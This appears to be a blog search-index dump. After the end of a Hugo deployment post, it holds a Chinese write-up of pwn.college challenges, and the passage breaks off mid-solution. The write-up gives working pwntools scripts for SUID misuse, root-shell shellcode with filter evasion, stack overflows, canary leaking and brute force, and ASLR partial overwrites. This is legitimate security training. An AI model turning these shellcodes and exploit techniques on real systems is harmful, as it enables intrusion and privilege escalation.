uses: peaceiris/actions-gh-pages@v3 if: github.ref == \u0026#39;refs/heads/main\u0026#39; with: github_token: ${{ secrets.TOKEN }} publish_dir: ./public 然后在 /static 创建 CNAME 文件，内容是自己的自定义域名，使得生成的 public 根目录下就包含这个 CNAME。最后确保 push 到 main 分支，actions 运行成功后会在 gh-pages 分支生成网站静态资源，在 GitHub Pages 里设置部署 gh-pages 的 / 目录即可。\n参考资料 # Hugo 文档\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nLoveIt 主题文档\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHugo 系列(3.0) - LoveIt 主题美化与博客功能增强 · 第一章\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nFavicon Generator\u0026#160;\u0026#x21a9;\u0026#xfe0e;\natomic-algolia\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSupported Functions - KaTeX\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHugo/Katex failed to render multi-line Latex\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n常用数学公式排版 KaTex 语法总结\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHugo 系列(3.2) - LoveIt 主题美化与博客功能增强 · 第三章\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHugo 系列(4) - 从 Hexo 迁移至 Hugo 以及使用 LoveIt 主题的踩坑记录\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-03-11","permalink":"/posts/hugo/","section":"Posts","summary":"\u003cp\u003e博客从 Hexo 迁移到了 Hugo。在静态网站生成器中，Hugo 的优势主要在于其性能和简单易用的配置。\u003c/p\u003e","title":"乔迁新居：Hugo 博客的配置与部署"},{"content":"","date":"2022-02-24","permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":"2022-02-24","permalink":"/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/","section":"Categories","summary":"","title":"二进制安全"},{"content":"","date":"2022-02-24","permalink":"/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/","section":"Tags","summary":"","title":"栈漏洞"},{"content":"","date":"2022-02-24","permalink":"/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/","section":"Tags","summary":"","title":"整数溢出"},{"content":"时隔许久，我居然又得做 pwn 题了。\nembryoio: Program Interaction # 1 # $ /challenge/$HOSTNAME 2 # $ /challenge/$HOSTNAME # ... jdlwsscr 3 # $ /challenge/$HOSTNAME ommhsqruhu 4 # $ ykpoaq=vpysbewhjx /challenge/$HOSTNAME 5 # $ echo mvrlsgks \u0026gt; /tmp/uulqde $ /challenge/$HOSTNAME \u0026lt; /tmp/uulqde 6 # $ /challenge/$HOSTNAME \u0026gt; /tmp/npruin $ cat /tmp/npruin 7 # $ env -i /challenge/$HOSTNAME 8 # $ echo \u0026#34;/challenge/$HOSTNAME\u0026#34; \u0026gt; ~/myscript.sh $ bash ~/myscript.sh 9-14 # 类似 1-7，但是使用了 8 的方法。\n15 # 运行 ipython，然后输入：\nimport subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary) 16-21 均需要在 ipython 环境下执行。\n16 # echo ztrvysos \u0026gt; input import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary, stdin=open(\u0026#39;input\u0026#39;, \u0026#39;r\u0026#39;)) 17 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen([binary, \u0026#39;dynoamrymg\u0026#39;]) 18 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary, env=dict(os.environ, iybxon=\u0026#34;lcoldvawsc\u0026#34;)) 19 # $ echo dtzlsano \u0026gt; /tmp/ofslag import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary, stdin=open(\u0026#34;/tmp/ofslag\u0026#34;,\u0026#34;r\u0026#34;)) 20 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary, stdout=open(\u0026#34;/tmp/gicfkh\u0026#34;,\u0026#34;w+\u0026#34;)) 21 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary, env=dict()) 22 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; subprocess.Popen(binary).wait() 23-28 # 类似 16-21，但使用了 22 的方法。\n29 # 29-35 模版，核心代码位于 /* TODO */ 处：\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; void pwncollege() {} int main() { char binary[30] = \u0026#34;/challenge/\u0026#34;; strcat(binary, getenv(\u0026#34;HOSTNAME\u0026#34;)); /* TODO */ return 0; } 核心代码：\nint pid = fork(); if (pid == 0) { execve(binary, NULL, NULL); } else { wait(NULL); } fork() 出子进程执行二进制文件，使得其父进程为我们自己的程序。\n30 # 同上。\n31 # char *argv[] = {binary, \u0026#34;pxcsyjgoss\u0026#34;, NULL}; int pid = fork(); if (pid == 0) { execve(binary, argv, NULL); } else { wait(NULL); } 32 # char *argv[] = {binary, \u0026#34;pxcsyjgoss\u0026#34;, NULL}; char *env[] = {\u0026#34;kzdezt=fgdnllplui\u0026#34;, NULL}; int pid = fork(); if (pid == 0) { execve(binary, argv, env); } else { wait(NULL); } 33 # int fd = open(\u0026#34;/tmp/igzuqf\u0026#34;, O_RDWR); int pid = fork(); if (pid == 0) { dup2(fd, STDIN_FILENO); close(fd); execve(binary, NULL, NULL); } else { close(fd); wait(NULL); } 34 # int fd = open(\u0026#34;/tmp/bkvmkz\u0026#34;, O_RDWR); int pid = fork(); if (pid == 0) { dup2(fd, STDOUT_FILENO); close(fd); execve(binary, NULL, NULL); } else { close(fd); wait(NULL); } 35 # 同 29。\n36 # $ /challenge/$HOSTNAME | cat 37 # $ /challenge/$HOSTNAME | grep pwn 38 # $ /challenge/$HOSTNAME | sed /pwn/p 39 # $ /challenge/$HOSTNAME | rev | rev 40 # $ cat | /challenge/$HOSTNAME 41 # $ rev | /challenge/$HOSTNAME 倒序输入密码，Ctrl+D。\n42-47 # 类似 36-41，但用 shell 脚本执行。\n48 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(binary, stdout=subprocess.PIPE) p2 = subprocess.Popen(\u0026#34;cat\u0026#34;, stdin=p1.stdout) p2.communicate() 48-53 都需要：\n$ ipython \u0026gt; %run interact.py 49 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(binary, stdout=subprocess.PIPE) p2 = subprocess.Popen([\u0026#34;grep\u0026#34;,\u0026#34;pwn\u0026#34;], stdin=p1.stdout) p2.communicate() 50 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(binary, stdout=subprocess.PIPE) p2 = subprocess.Popen([\u0026#34;sed\u0026#34;,\u0026#34;/pwn/p\u0026#34;], stdin=p1.stdout) p2.communicate() 51 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(binary, stdout=subprocess.PIPE) p2 = subprocess.Popen(\u0026#34;rev\u0026#34;, stdin=p1.stdout, stdout=subprocess.PIPE) p3 = subprocess.Popen(\u0026#34;rev\u0026#34;, stdin=p2.stdout) p3.communicate() 52 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(\u0026#34;cat\u0026#34;, stdout=subprocess.PIPE) p2 = subprocess.Popen(binary, stdin=p1.stdout) p2.communicate() 53 # import subprocess import os binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; p1 = subprocess.Popen(\u0026#34;rev\u0026#34;, stdout=subprocess.PIPE) p2 = subprocess.Popen(binary, stdin=p1.stdout) p2.communicate() 倒序输入密码，Ctrl+D。\n54-59 # 类似 48-53，但使用 python 执行而不是 ipython。\n60-65 # 类似 36-41，但使用 29 的方法编译出 a.out 并执行。\n66 # $ find /challenge/ -name embryoio* -exec {} \\; 67 # $ find /challenge/ -name embryoio* -exec {} uwazdyddun \\; 68 # 68-73 模版：\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; void pwncollege() {} int main() { char binary[30] = \u0026#34;/challenge/\u0026#34;; strcat(binary, getenv(\u0026#34;HOSTNAME\u0026#34;)); /* TODO */ return 0; } 核心代码：\nint i; char *argv[200]; argv[0] = binary; for (i = 1; i \u0026lt; 142; i++) { argv[i] = \u0026#34;dummy\u0026#34;; } argv[142] = \u0026#34;nillucsndu\u0026#34;; argv[143] = NULL; execve(binary, argv, NULL); 69 # execve(binary, NULL, NULL); 70 # char *env[] = {\u0026#34;146=sdzbeolria\u0026#34;, NULL}; execve(binary, NULL, env); 71 # int i; char *env[] = {\u0026#34;254=xeqznkovla\u0026#34;, NULL}; char *argv[100]; argv[0] = binary; for (i = 1; i \u0026lt; 77; i++) { argv[i] = \u0026#34;dummy\u0026#34;; } argv[77] = \u0026#34;balycwokzx\u0026#34;; argv[78] = NULL; execve(binary, argv, env); 72 # #!/bin/bash cd /tmp/ehpfci /challenge/$HOSTNAME \u0026lt; jysqyp 73 # #!/bin/bash bash -c \u0026#39;cd /tmp/wvliga \u0026amp;\u0026amp; /challenge/$HOSTNAME\u0026#39; 74 # from pwn import * binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; context.binary = binary args = [binary] for i in range(41): args.append(\u0026#34;gmphbjwhvy\u0026#34;) p = process(args) p.interactive() babysuid: Program Misuse # 1-9 # [command] 指题目中拥有 root 权限的程序名。\n$ [command] /flag 10 # $ rev /flag | rev 11 # $ od -w1000 -c /flag $ echo \u0026#39;p w n . c o l l e g e { s C G - E C B Z N 9 x _ p W C f M j - T 4 i 1 L V D H . Q X z U T M s A T O 4 I z W }\u0026#39; | sed \u0026#39;s/ //g\u0026#39; 12 # $ hd /flag 13 # $ xxd -c 100 /flag 14 # $ base32 /flag | base32 -d 15 # $ base64 /flag | base64 -d 16 # $ split /flag $ cat xaa 17 # $ gzip -k /flag $ gzip -d /flag.gz -c 18 # $ bzip2 -k /flag $ bzip2 -d /flag.bz2 -c 19 # $ zip flag.zip /flag $ unzip flag.zip $ cat flag 20 # $ tar -cf flag.tar /flag $ tar -xf flag.tar -O 21 # $ ar r flag.bak /flag $ ar p flag.bak embryoasm: Assembly Refresher # 模版：\nfrom pwn import * import os assembly = \u0026#39;\u0026#39;\u0026#39; TODO \u0026#39;\u0026#39;\u0026#39; binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; context.binary = binary p = process(binary) p.send(asm(assembly)) p.interactive() 1 # mov rdi, 0x1337 2 # add rdi, 0x331337 3 # imul rdi, rsi add rdi, rdx mov rax, rdi 4 # div 默认 rax 为被除数，商放到 rax，余数放到 rdx。\nmov rax, rdi div rsi 5 # mov rax, rdi div rsi mov rax, rdx 6 # rax, eax, ax, (ah | al) rbx, ebx, bx, (bh | bl) rdi, edi, di, (dih | dil) rsi, esi, si, (sih | sil) mov al, dil mov bx, si 7 # 注意字节和 bit 转换。\nshl rdi, 32 shr rdi, 56 mov rax, rdi 8 # and rdi, rsi xor rax, rax or rax, rdi 9 # and rdi, 1 xor rdi, 1 xor rax, rax or rax, rdi 10 # 注意 add 指令中，被加数的 QWORD PTR 不可省略。\nmov rax, QWORD PTR [0x404000] add QWORD PTR [0x404000],0x1337 11 # mov al, BYTE PTR [0x404000] mov bx, WORD PTR [0x404000] mov ecx, DWORD PTR [0x404000] mov rdx, QWORD PTR [0x404000] 12 # 长度较长的数字先放寄存器再赋值。\nmov rbx,0xdeadbeef00001337 mov [rdi], rbx mov rcx, 0x000000c0ffee0000 mov [rsi],rcx 13 # mov rax, QWORD PTR [rdi] mov rbx, QWORD PTR [rdi+8] add rax, rbx mov [rsi], rax 14 # pop rax sub rax, rdi push rax 15 # push rdi push rsi pop rdi pop rsi 16 # mov rax, [rsp+24] add rax, [rsp+16] add rax, [rsp+8] add rax, [rsp] mov rbx, 4 div rbx push rax 17 # 中间有 0x51 个 nop，实际上跳了 0x53。\njmp .L2 .rept 0x51 nop .endr .L2: pop rdi mov rbx, 0x403000 jmp rbx 18 # 耐心算即可。\nmov ebx, [rdi] mov eax, [rdi+4] mov ecx, [rdi+8] mov edx, [rdi+12] cmp ebx, 0x7f454c46 je .L2 cmp ebx, 0x00005a4d je .L3 imul eax, ecx imul eax, edx jmp .done .L2: add eax, ecx add eax, edx jmp .done .L3: sub eax, ecx sub eax, edx .done: 19 # cmp rdi, 3 jle .L2 jmp [rsi+0x20] .L2: imul rdi, 0x8 add rdi, rsi jmp [rdi] 20 # xor rax, rax; mov rcx, rsi; .loop: mov ebx, DWORD PTR [rdi]; add rax, rbx; add rdi, 0x4; dec rcx; jnz .loop; div rsi 21 # xor rax, rax; .loop: cmp BYTE PTR [rdi], 0; je .done; inc rax; inc rdi; jmp .loop; .done: 22 # 注意 cmp 时用 BYTE PTR，以及 rax 和 rdi 的上下文保存和恢复。\nxor rax, rax mov rbx, 0x403000 # foo() cmp rdi, 0 # if src_addr != 0 je .done .loop: cmp BYTE PTR [rdi], 0 # while [src_addr] != 0 je .done cmp BYTE PTR [rdi], 90 # if [src_addr] \u0026lt;= 90 jg .fi push rax # save rax push rdi # save rdi mov rdi, [rdi] # arg1 \u0026lt;- [src_addr] call rbx pop rdi # restore rdi mov [rdi], rax # [src_addr] \u0026lt;- retval of foo() pop rax # restore rax inc rax .fi: inc rdi # src_addr++ jmp .loop .done: ret 23 # 注意用 rsp 寻址代替 rbp 寻址：[rbp-x] == [rsp+x]。\npush rbp mov rbp, rsp sub rsp, 0x100 # 0 - 0xff xor rbx, rbx .loop: mov cl, BYTE PTR [rdi+rbx] # curr_byte = [src_addr + i] inc BYTE PTR [rsp+rcx] # [stack_base - curr_byte]++ inc rbx # i++ cmp rbx, rsi # for i \u0026lt; size jl .loop xor rbx, rbx # b = 0 xor rcx, rcx # max_freq = 0 xor rax, rax # max_freq_byte = 0 .loop2: cmp BYTE PTR [rsp+rbx], cl # if [stack_base - b] \u0026gt; max_freq jle .fi; mov cl, BYTE PTR [rsp+rbx] # max_freq = [stack_base - b] mov rax, rbx # max_freq_byte = b .fi: inc rbx # b++ cmp rbx, 0xff # for b \u0026lt;= 0xff jle .loop2 mov rsp, rbp pop rbp # (mov rsp, rbp) + (pop rbp) = leave ret babyshell: Shellcode Injection # 模版：\nfrom pwn import * binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; context.binary = binary p = process(binary) nop = b\u0026#39;\\x90\u0026#39; # TODO p.interactive() 1 # ORW 方法:\n# read(0, address of rip, 1000) sc1 = \u0026#34;\u0026#34;\u0026#34; xor rax, rax xor rdi, rdi lea rsi, [rip] mov rdx, 1000 # \u0026lt;- rip syscall # sc2 comes after syscall \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) p.send(asm(sc1)) p.send(nop*16 + asm(sc2)) 拿 Shell 方法:\n# execve(\u0026#34;/bin/sh\\x00\u0026#34;,[\u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;-p\\x00\\x00\u0026#34;],NULL) sc = \u0026#34;\u0026#34;\u0026#34; mov rax, 59 # execve mov rbx, 0x68732f6e69622f # \u0026#34;/bin/sh\u0026#34; push rbx mov rdi, rsp # rdi -\u0026gt; \u0026#34;/bin/sh\u0026#34; on stack push 0x702d # \u0026#34;-p\u0026#34; mov rcx, rsp # rcx -\u0026gt; \u0026#34;-p\u0026#34; on stack push 0 push rcx push rdi mov rsi, rsp # rsi -\u0026gt; [rdi, rcx, 0] on stack -\u0026gt; [\u0026#34;/bin/sh\u0026#34;,\u0026#34;-p\u0026#34;,NULL] mov rdx, 0 # NULL syscall \u0026#34;\u0026#34;\u0026#34; p.send(asm(sc)) 2 # nop sled，沿用上题的 sc：\np.send(nop*0x800 + asm(sc)) 3 # 编码去掉 NULL byte，沿用上题的 sc：\np.send(encoder.encode(asm(sc), b\u0026#39;\\x00\u0026#39;)) 4 # 不能出现 H 字节，因此使用 32 位寄存器：\n# read(0, address of rip, 1000) sc1 = \u0026#34;\u0026#34;\u0026#34; xor eax, eax xor edi, edi lea esi, [rip] mov edx, 1000 # \u0026lt;- rip syscall # sc2 comes after syscall \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) p.send(asm(sc1)) p.send(nop*16 + asm(sc2)) 5 # 不能出现 syscall。syscall 是 0f 05，因此在最后加一句 0e 05，然后用 inc BYTE PTR [rip] 给最后一句加一变成 syscall。\n# read(0, address of rip, 1000) sc1 = \u0026#34;\u0026#34;\u0026#34; xor rax, rax xor rdi, rdi lea rsi, [rip] mov rdx, 1000 # \u0026lt;- rip inc BYTE PTR [rip] # rip on next line, which is 0e 05 \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) p.send(asm(sc1)+b\u0026#39;\\x0e\\x05\u0026#39;) p.send(nop*16 + asm(sc2)) 6 # 不能出现 syscall，而且禁止在 shellcode 前 4096 字节区域内的写操作。我直接跳了前 4096 字节然后用 5 的方法，暂时没有想到其他方法。\n# read(0, address of rip, 1000) sc1 = \u0026#34;\u0026#34;\u0026#34; .rept 4096 nop .endr xor rax, rax xor rdi, rdi lea rsi, [rip] mov rdx, 1000 # \u0026lt;- rip inc BYTE PTR [rip] # rip on next line, which is 0e 05 \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) p.send(asm(sc1)+b\u0026#39;\\x0e\\x05\u0026#39;) p.send(nop*16 + asm(sc2)) 7 # 关闭了 stdin，因此不能用上文 ORW 方法中的 multi-stage 方式读 shellcode 了；关闭了 stdout 和 stderr，因此没有回显。这里用的方法是通过 chmod 系统调用修改 /flag 权限，最后 cat /flag 即可。\n# chmod(\u0026#34;/flag\u0026#34;, 777) sc = \u0026#34;\u0026#34;\u0026#34; mov rax, 0x5a # chmod mov rbx, 0x67616c662f # \u0026#34;/flag\u0026#34; push rbx mov rdi, rsp # rdi -\u0026gt; \u0026#34;/flag\u0026#34; on stack mov rsi, 0x1ff # 777 -\u0026gt; 111 111 111 syscall \u0026#34;\u0026#34;\u0026#34; p.send(asm(sc)) 8 # 只能读 0x12 字节，因此要尽量缩短汇编代码的长度。由于 /flag 最终需要占 8 字节，需要 64 位寄存器存储，因此可以 ln -s /flag a 创建一个名为 a 的符号链接。权限方面也只需要 others 拥有读权限，因此设置为最小值 4 即可。最后根据情况缩减所使用的寄存器长度。\n注意这里用 mov bx, 0x61 而不是 bl，是因为我们将 bx 推到栈上时有可能并没有遇到 0 字节，使得字符串 a 没能结尾。因此我们给 bx 赋值可以保证字符串以 0 字节结尾。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod mov bx, 0x61 # \u0026#34;a\u0026#34; push rbx mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; p.send(asm(sc)) 9 # 每 10 字节会插入 10 字节的 0xcc，也就是 int 3，题目提示我们要阻止这些 int 3 被执行，因此计算好字节数并 jmp 掉即可。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod mov bx, 0x61 # \u0026#34;a\u0026#34; push rbx nop jmp .L2 .rept 10 nop .endr .L2: mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; p.send(asm(sc)) 10-12 # payload 和 8 相同，因为 8 的 payload 恰好可以满足这几题的条件。\n13 # 只能读 0xc 字节，需要进一步压缩 8 的 payload。容易注意到 mov bx, 0x61 和 push rbx 可以合并为 push 0x61，恰好 12 字节。\n# chmod(\u0026#34;a\u0026#34;, 4) sc = \u0026#34;\u0026#34;\u0026#34; mov al, 0x5a # chmod push 0x61 # \u0026#34;a\u0026#34; mov rdi, rsp # rdi -\u0026gt; \u0026#34;a\u0026#34; on stack mov sil, 4 # 4 -\u0026gt; 000 000 100 syscall \u0026#34;\u0026#34;\u0026#34; p.send(asm(sc)) 14 # 只能读 6 字节。注意到 rax 原本就是 0，可以省略对其的初始化；gdb 中能看到 rdx 中原本存储了 shellcode 的地址，因此我们可以直接写入这个地址；rsi 中原本存储了一个较大的数字，我们可以直接用来作为 read 的第三个参数。综上，要做的只有给 rdi 赋值 0、将 rdx 的值赋值给 rsi、调用 syscall 三件事，每件事都可以压缩到 2 个字节。\n# read(0, address of shellcode, some big number) sc1 = \u0026#34;\u0026#34;\u0026#34; xor edi, edi push rdx pop rsi syscall \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) p.send(asm(sc1)) p.send(nop*16 + asm(sc2)) babymem: Memory Errors # 模版：\nfrom pwn import * sa = lambda delim,data: p.sendafter(delim,data) sla = lambda delim,data: p.sendlineafter(delim,str(data)) r = lambda num=4096: p.recv(num) ru = lambda delims,drop=True: p.recvuntil(delims,drop) leak = lambda name,addr: log.success(\u0026#39;{} = {:#x}\u0026#39;.format(name, addr)) def s(pl, sz=None): if sz is None: sz = len(pl) sla(\u0026#39;Payload size: \u0026#39;, str(sz)) sa(\u0026#39;bytes)!\\n\u0026#39;, pl) binary = f\u0026#39;/challenge/{os.getenv(\u0026#34;HOSTNAME\u0026#34;)}\u0026#39; context.binary = binary # context.log_level = \u0026#39;DEBUG\u0026#39; p = process(binary) nop = b\u0026#39;\\x90\u0026#39; # TODO p.interactive() 1.0 # 直接给了偏移量 44，只要溢出 1 字节就能将目标值改成非 0 了。\npayload = b\u0026#39;a\u0026#39;*44 + b\u0026#39;\\x01\u0026#39; s(payload) 1.1 # 没有给偏移量，可以无视偏移量直接输入很长的 payload，因为 canary 检查在 win 执行之后。\npayload = b\u0026#39;a\u0026#39;*0x100 s(payload) 2.0 # 和 1.0 类似，只不过在堆上。\npayload = b\u0026#39;a\u0026#39;*192 + b\u0026#39;\\x01\u0026#39; s(payload) 2.1 # 和 1.1 类似，只不过在堆上。\npayload = b\u0026#39;a\u0026#39;*0x200 s(payload) 3.0 # 提供了偏移量和目标函数地址，直接覆盖返回地址即可。\nwin = 0x401554 payload = b\u0026#39;a\u0026#39;*88+p64(win) s(payload) 3.1 # 用 pwndbg 的 cyclic 可以准确确定偏移量，info func 可以得到 win 的地址。\nwin = 0x4020e1 payload = b\u0026#39;a\u0026#39;*(128+8)+p64(win) s(payload) 注：babymem 后续所有题目的 x.1 均是在 x.0 基础上要求自己确定偏移量和地址，不再赘述。\n4.0 # 对输入长度进行检查，可以用整数溢出绕过，绕过后可能需要多运行几次才能成功，题目也给了提示：\nBecause the read() call will interpret your size differently than the check above, the resulting read will be unstable and might fail. You will likely have to try this several times before your input is actually read.\n这里 size 也可以直接写 -1。\nwin = 0x401861 payload = b\u0026#39;a\u0026#39;*88+p64(win) size = 0xffffffff s(payload, size) 5.0 # 需要做一次乘法后得到溢出的结果，可以用 2 * 2147483648 得到。\nwin = 0x4017eb payload = b\u0026#39;a\u0026#39;*152+p64(win) num = 2 size = 2147483648 sla(\u0026#39;to send: \u0026#39;, num) sla(\u0026#39;record: \u0026#39;, size) sa(\u0026#39;bytes)!\\n\u0026#39;, payload) 6.0 # 题目给了做法，就是跳到检查语句后面的地址就可以绕过检查。\nwin = 0x402177 payload = b\u0026#39;a\u0026#39;*88+p64(win) s(payload) 7.0 # 和 6.0 一样需要跳到检查语句后面，IDA 可以看到这个地址是 0x358，区别在于开启了 ASLR 我们只能确定地址的后三位。这里使用的技巧是仅仅覆盖最后两个字节，此时倒数第 4 个 bit 有 1/16 的概率猜对，多运行几次即可。\n本题可以删除模版中的 p=process(binary) 一行。\nwin = 0x358 payload = b\u0026#39;a\u0026#39;*72+p16(win) while True: p = process(binary) s(payload) res = p.recvall() if b\u0026#39;pwn.college{\u0026#39; in res: print(res[-100:]) break 8.0 # 在 7.0 的基础上，会用 strlen 检查 buf 长度，直接 0 字节截断即可。\nwin = 0x14f payload = b\u0026#39;\\x00\u0026#39;*8 + b\u0026#39;a\u0026#39;*128 + p16(win) while True: p = process(binary) s(payload) res = p.recvall() if b\u0026#39;pwn.college{\u0026#39; in res: print(res[-100:]) break 9.0 # 本题需要覆盖读计数器，从而跳过 canary 写入返回地址，题目给了读计数器的实现：\nwhile (n \u0026lt; size) { n += read(0, input + n, 1); } 还给了 n 的偏移量 36 和返回地址偏移量 56，因此根据上述实现将 n 覆盖为 55，下一次循环就可以写返回地址的最低字节了。由于要写最低两字节，因此 size 设置为 58 即可，和 payload 长度无关。\nwin = 0xc0a payload = b\u0026#39;a\u0026#39;*36+p8(56-1)+p16(win) size = 56+2 while True: p = process(binary) s(payload, size) res = p.recvall() if b\u0026#39;pwn.college{\u0026#39; in res: print(res[-100:]) break 10.0 # flag 在栈上，距离输入 73 字节的地方，小于输入到 rbp 的距离，因此本题不需要溢出，也不用管 canary 和 ASLR，只需要填充 73 个非零字节，最后打印时就会顺带打印出后面的 flag。\npayload = b\u0026#39;a\u0026#39;*73 s(payload) 11.0 # 类似 10.0，只不过 mmap 在了堆上。\npayload = b\u0026#39;a\u0026#39;*4096*7 s(payload) 12.0 # 题目提供了一个后门，使得只要输入中含有 REPEAT，challenge() 就会重新执行。利用这一点以及 canary 最低字节必定为 0 的特性，我们覆盖 canary 最低字节为 0x01，从而使得栈上字符串不被截断，顺带打印出 canary 高 7 字节的值。随后在溢出时只需要注意用正确的值覆盖 canary 即可绕开检测，剩余部分类似 7.0。\nwin = 0x751 while True: p = process(binary) payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;a\u0026#39;*0x10 + b\u0026#39;\\x01\u0026#39; s(payload) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) payload = b\u0026#39;a\u0026#39;*0x18 + p64(canary) + b\u0026#39;a\u0026#39;*8 + p16(win) s(payload) res = p.recvall() if b\u0026#39;pwn.college{\u0026#39; in res: print(res[-100:]) break 13.0 # 类似 10.0。\npayload = b\u0026#39;a\u0026#39;*172 s(payload) 14.0 # 本题和 12.0 的区别在于打印函数只会打印 268 个字符，而输入到 canary 相距 272 字节。不过本题比较仁慈，canary 的值在栈上距离更近的位置也有出现，可以 leak 这些位置的值。\nwin = 0x13c while True: p = process(binary) payload = b\u0026#39;REPEATaa\u0026#39; + b\u0026#39;\\x01\u0026#39; s(payload) ru(b\u0026#39;\\x01\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + r(7)) leak(\u0026#39;canary\u0026#39;, canary) payload = b\u0026#39;a\u0026#39;*280 + p64(canary) + b\u0026#39;a\u0026#39;*8 + p16(win) s(payload) res = p.recvall() if b\u0026#39;pwn.college{\u0026#39; in res: print(res[-100:]) break 15.0 # 暴力枚举 canary 的每一位，因为服务器每次 fork() 不会重新随机产生 canary（注意保持服务器开启）。而在暴力猜 win 地址倒数第四位时则可以通过重启服务器来重试。\nwin = 0x1d85 payload = b\u0026#39;a\u0026#39;*24 + b\u0026#39;\\x00\u0026#39; for i in range(7): for b in range(0x100): p = remote(\u0026#34;127.0.0.1\u0026#34;, 1337) guess = b.to_bytes(1, \u0026#39;big\u0026#39;) s(payload + guess) ru(\u0026#39;Goodbye!\\n\u0026#39;) res = p.recv(timeout=0.5) if res == b\u0026#39;\u0026#39;: leak(f\u0026#39;Byte {i} of canary\u0026#39;, b) payload += guess break p = remote(\u0026#34;127.0.0.1\u0026#34;, 1337) payload += b\u0026#39;a\u0026#39;*8 + p16(win) s(payload) toddlerone: Exploitation Scenarios # 模版同 babymem。\n1.0 # 注入类似 babyshell 1 的 shellcode，然后 ret2shellcode。\nORW 方法：\n# read(0, address of rip, 1000) sc1 = \u0026#34;\u0026#34;\u0026#34; xor rax, rax xor rdi, rdi lea rsi, [rip] mov rdx, 1000 # \u0026lt;- rip syscall # sc2 comes after syscall \u0026#34;\u0026#34;\u0026#34; # orw sc2 = shellcraft.readfile(\u0026#34;/flag\u0026#34;, 1) sc1_addr = 0x169e0000 sa(\u0026#39;stdin.\u0026#39;, asm(sc1)) payload = b\u0026#39;a\u0026#39;*0x38 + p64(sc1_addr) s(payload) p.send(nop*16 + asm(sc2)) 拿 shell 方法：\n# execve(\u0026#34;/bin/sh\\x00\u0026#34;,[\u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;-p\\x00\\x00\u0026#34;],NULL) sc = 